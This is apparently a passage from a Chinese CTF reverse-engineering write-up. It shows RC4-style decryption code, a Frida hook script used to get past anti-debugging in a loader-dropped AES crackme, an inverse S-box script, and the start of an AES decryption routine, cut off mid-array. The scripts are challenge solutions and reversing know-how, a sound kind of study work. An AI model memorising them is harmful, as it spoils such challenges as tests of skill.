<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cipher[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x38</span>, <span class="number">0x47</span>, <span class="number">0x62</span>, <span class="number">0x0A</span>, <span class="number">0x79</span>, <span class="number">0x6A</span>, <span class="number">0x03</span>, <span class="number">0x66</span>, <span class="number">0xC0</span>, <span class="number">0x69</span>, <span class="number">0x8D</span>, <span class="number">0x1C</span>, <span class="number">0x84</span>, <span class="number">0x0F</span>, </span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x4A</span>, <span class="number">0x3B</span>, <span class="number">0x08</span>, <span class="number">0xE3</span>, <span class="number">0x30</span>, <span class="number">0x4F</span>, <span class="number">0xB9</span>, <span class="number">0x6C</span>, <span class="number">0xAB</span>, <span class="number">0x36</span>, <span class="number">0x24</span>, <span class="number">0x52</span>, <span class="number">0x81</span>, <span class="number">0xCF</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> key1[]=<span class="string">&quot;keykey&quot;</span>;</span><br><span class="line"><span class="type">char</span> key[<span class="number">100</span>]=<span class="string">&quot;ban_debug!&quot;</span>;</span><br><span class="line"><span class="type">char</span> s[<span class="number">256</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> __int8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> __int64;</span><br><span class="line"> <span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2,<span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+23h] [rbp-41Dh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp-41Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+28h] [rbp-418h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+2Ch] [rbp-414h]</span></span><br><span class="line">  <span class="type">int</span> v8[<span class="number">258</span>]; <span class="comment">// [rsp+30h] [rbp-410h] BYREF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[i] = i;</span><br><span class="line">    v8[i] = (<span class="type">unsigned</span> <span class="type">char</span>)a2[i % a3];</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">255</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (v8[j] + v6 + (<span class="type">unsigned</span> <span class="type">char</span>)a1[j]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[j];</span><br><span class="line">    a1[j] = a1[v6];</span><br><span class="line">    a1[v6] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>  <span class="title function_">crypt1</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+27h] [rbp-11h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+30h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( a3 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v6 = (v6 + (<span class="type">unsigned</span> <span class="type">char</span>)a1[v5]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[v5];</span><br><span class="line">    a1[v5] = a1[v6];</span><br><span class="line">    a1[v6] = v4;</span><br><span class="line">    a2[i] ^= a1[(<span class="type">unsigned</span> <span class="type">char</span>)(a1[v5] + a1[v6])];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">crypt2</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+27h] [rbp-11h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+30h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( a3 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v6 = (v6 + (<span class="type">unsigned</span> <span class="type">char</span>)a1[v5]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[v5];</span><br><span class="line">    a1[v5] = a1[v6];</span><br><span class="line">    a1[v6] = v4;</span><br><span class="line">    a2[i] += a1[(<span class="type">unsigned</span> <span class="type">char</span>)(a1[v5] + a1[v6])];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">init(s,key1,<span class="built_in">strlen</span>(key1));</span><br><span class="line">crypt1(s,key,<span class="built_in">strlen</span>(key));</span><br><span class="line"> <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">init(s,key,<span class="built_in">strlen</span>(key));</span><br><span class="line">crypt2(s,cipher,<span class="number">32</span>);</span><br><span class="line"><span class="built_in">puts</span>(cipher);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Reverse3">Reverse3</h4>
<p>程序有花指令和反调试。<br>
去掉花指令后发现并没有什么逻辑。<br>
在TlsCallback_0里发现字符串FileName异或0x11。<br>
<img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/WSXUuRZjIKL8GJE.png"
                        alt="alt text"
                 ><br>
异或回来找到了1.exe这个程序，加密应该主要位于这里，原本的exe只是一个加载器。<br>
观察1.exe逻辑，是一个aes加密，但是有换盒。<br>
把密钥和密文取出，反出逆s盒，进行aes解密，发现无法解密。<br>
比对内存中的数据和脚本加密数据发现是一样的，解密不可能存在问题。<br>
猜测是加载器修改了key或者其他数据。<br>
frida不会被反调试检测，用frida hook key发现key改变。<br>
输入改变的key仍然不可解密。<br>
接下来hook了sbox，sbox改变，但还是不可解密。<br>
hook密文，发现密文没有改变，那改变的可能是输入的flag数据。<br>
多次hook发现输入的flag每个字节都会有一定偏移。<br>
我们把可打印字符串表作为flag输入，获得字符变化的对应关系。<br>
<img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/KpsBUy1RDEPLZdx.png"
                        alt="alt text"
                 ><br>
按照对应关系输出aes解密的数据即可得到flag。</p>
<p>frida hook脚本</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> inter=<span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> sgame = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;1.exe&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(sgame==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;无&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">clearInterval</span>(inter);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&quot;</span>+sgame.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x001EC9</span>  ));</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sgame.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x001EC9</span>  ), &#123; </span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> rax=<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">rax</span>; </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&quot;</span> +rax);</span><br><span class="line">		<span class="comment">// 检查密文有没有被修改</span></span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title function_">ptr</span>(rax),&#123;<span class="attr">length</span>: <span class="number">50</span>,<span class="attr">ansi</span>:<span class="literal">true</span>&#125;));</span><br><span class="line">      </span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sgame.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x001E2C</span>  ), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;input flag&quot;</span>);</span><br><span class="line">  <span class="comment">// 检查输入flag的时候有没有被修改</span></span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title function_">ptr</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">rdx</span>),&#123;<span class="attr">length</span>: <span class="number">16</span>,<span class="attr">ansi</span>:<span class="literal">true</span>&#125;));</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sgame.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x1380</span>), &#123; </span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> rdx=<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">rdx</span>; </span><br><span class="line">     <span class="comment">// 检查key ,sbox ,进入函数的flag有没有被修改</span></span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;key&quot;</span> );</span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title function_">ptr</span>(rdx),&#123;<span class="attr">length</span>: <span class="number">16</span>,<span class="attr">ansi</span>:<span class="literal">true</span>&#125;));</span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;flag:&quot;</span> );</span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title function_">ptr</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">rcx</span>),&#123;<span class="attr">length</span>: <span class="number">16</span>,<span class="attr">ansi</span>:<span class="literal">true</span>&#125;));</span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sbox:&quot;</span> );</span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title function_">ptr</span>(sgame.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x5160</span>)),&#123;<span class="attr">length</span>: <span class="number">256</span>,<span class="attr">ansi</span>:<span class="literal">true</span>&#125;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125; , <span class="number">1</span>) </span><br></pre></td></tr></table></figure>
<p>逆盒脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_s_box = [</span><br><span class="line">    <span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,<span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,<span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,<span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,<span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,<span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,<span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,<span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,<span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>,<span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,<span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>,<span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,<span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,<span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,<span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">new_contrary_sbox = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(new_s_box))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    line = (new_s_box[i]&amp;<span class="number">0xf0</span>)&gt;&gt;<span class="number">4</span></span><br><span class="line">    rol = new_s_box[i]&amp;<span class="number">0xf</span></span><br><span class="line">    new_contrary_sbox[(line*<span class="number">16</span>)+rol] = i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(new_contrary_sbox))</span><br><span class="line"><span class="built_in">print</span>(new_contrary_sbox)</span><br><span class="line"><span class="built_in">print</span>(string.printable)</span><br></pre></td></tr></table></figure>
<p>aes解密脚本，每次解密一段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">AddRoundKey</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *plaintext, <span class="type">unsigned</span> <span class="type">char</span> * CipherKey)</span><span class="comment">/*轮密钥加*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)  plaintext[j] = plaintext[j] ^ CipherKey[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">SubBytes</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *plaintext, <span class="type">unsigned</span> <span class="type">char</span> *plaintextencrypt, <span class="type">int</span> count)</span><span class="comment">/*S盒置换*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> row, column;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> Sbox[<span class="number">16</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">		      <span class="comment">/* 0     1     2     3     4     5     6     7     8     9     a     b     c     d     e     f */</span></span><br><span class="line">		 <span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,<span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,<span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,<span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,<span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,<span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,<span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,<span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,<span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>,<span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,<span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>,<span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,<span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,<span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,<span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span></span><br><span 